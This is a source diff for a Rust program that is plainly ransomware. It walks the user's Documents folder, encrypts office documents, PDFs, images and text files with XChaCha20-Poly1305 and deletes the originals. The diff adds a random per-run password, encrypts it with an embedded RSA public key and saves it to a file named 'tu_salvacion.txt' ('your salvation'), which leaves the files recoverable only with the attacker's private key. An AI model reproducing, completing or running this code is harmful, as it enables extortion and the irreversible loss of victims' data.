@@ -3,6 +3,9 @@ pub mod build;
 use std::fs::{File, remove_file};
 use std::io::{BufWriter, Read, Write};
 
+use rsa::Pkcs1v15Encrypt;
+use rsa::{RsaPublicKey, pkcs1::DecodeRsaPublicKey};
+
 use orion::hazardous::{
     aead::xchacha20poly1305::{seal, open, Nonce, SecretKey},
     mac::poly1305::POLY1305_OUTSIZE,
@@ -11,6 +14,8 @@ use orion::hazardous::{
 
 use orion::hazardous::stream::chacha20::CHACHA_KEYSIZE;
 use orion::kdf::{derive_key, Password, Salt};
+use rand::distributions::Alphanumeric;
+use rand::Rng;
 use rand_core::{OsRng, RngCore};
 use walkdir::WalkDir;
 
@@ -129,6 +134,7 @@ pub fn decrypt_large_file(
 }
 
 fn main() {
+    
     let extensions = ["docx", "xlsx", "pdf", "jpeg", "jpg", "txt"];
 
     let documents_dir = match dirs::document_dir() {
@@ -138,6 +144,28 @@ fn main() {
             return;
         }
     };
+    let pass = generate_random_string(20);
+
+    let pem = "-----BEGIN PUBLIC KEY-----
+MIICITANBgkqhkiG9w0BAQEFAAOCAg4AMIICCQKCAgB5OsRTqlZyDWrtA4eWiqsq
+0ylZChWRQy8jY6CW4iTV6rFokdbv+dUNmSAEc1zjwh1boJ5vmbHJvE678tgjb7de
+b7pvz9gZ9MkpSH+Y9GCDBYfDZ8RZeaip8iXw0uUsVRX+zszYnPvDJL6LagvH0nXC
+IyNDt6e3Jbrqir9TrBTFqfIcdC/VK3KUtlmEc9ddvDOPQgssYxlmvUTq6vnHcIGJ
+P44xOmq9i+kLNSfkNKqvz0mgw47vwtew7pfTBsv374RAW34fQGXY9aKPu+1hA4o8
+9zt6CUz/sEwp0yasx5JXTsSgoxO5p9LaQkqChDhra1PdZKx+4ffgtlrv4wBsE77Y
+IMGgJ5JZ5A+SuLFO7W4dEU0Z2efjlkc9LZOOO9ftTOTQkwqvI7k61r1ny1KnYak+
+e2Sxyj85SbOxhIJ6uPtxythMF7WVhjt/6D+CqDsqhAO+b5tak28eM2AZsfWooYSm
+hKl1stVsvBY9GxSt0kv/nxKTkmkR4xx6WSxGiYyPVW0nv2w1KhPo0wMyeY9SO9xO
+dD+mK8dE6gzZKEmhYyDDqo4GxNq7zcuzli2DcyJRM0dlM4l790/sPwaGOAiZ+yWo
+Ee0dgWcIEDLfOxn1tZiuiNQy5Z3CiRkoVlZqfBnDJG9dd2zYJRkEA1IJSUYQyGGh
+PpeQB5AFqhJgbOr6L07eCwIDAQAB
+-----END PUBLIC KEY-----";
+
+    let public_key = RsaPublicKey::from_pkcs1_pem(pem).unwrap();
+    let mut rng = rand::thread_rng();
+
+    let passenc = public_key.encrypt(&mut rng, Pkcs1v15Encrypt, pass.as_bytes()).unwrap();
+    let _ = save_key_to_file(&passenc, "tu_salvacion.txt");
 
     for entry in WalkDir::new(documents_dir)
         .into_iter()
@@ -149,10 +177,19 @@ fn main() {
                 .map(|ext| extensions.contains(&ext))
                 .unwrap_or(false)
         }) {
-        let _encrypted_filee = encrypt_large_file(entry.path().to_str().unwrap_or(""), &format!("{}{}", entry.path().to_str().unwrap_or(""), ".enc" ), "password".to_owned());
+        let _encrypted_filee = encrypt_large_file(entry.path().to_str().unwrap_or(""), &format!("{}{}", entry.path().to_str().unwrap_or(""), ".enc" ), pass.to_owned());
         let _ = remove_file(entry.path());
     }
 }
+fn generate_random_string(length: usize) -> String {
+    let s : String = rand::thread_rng()
+        .sample_iter(&Alphanumeric)
+        .take(length)
+        .map(char::from)
+        .collect();
+    s
+}
+
 
 fn save_key_to_file(key: &[u8], file_name: &str) -> std::io::Result<()> {
     let desktop_dir = match dirs::desktop_dir() {
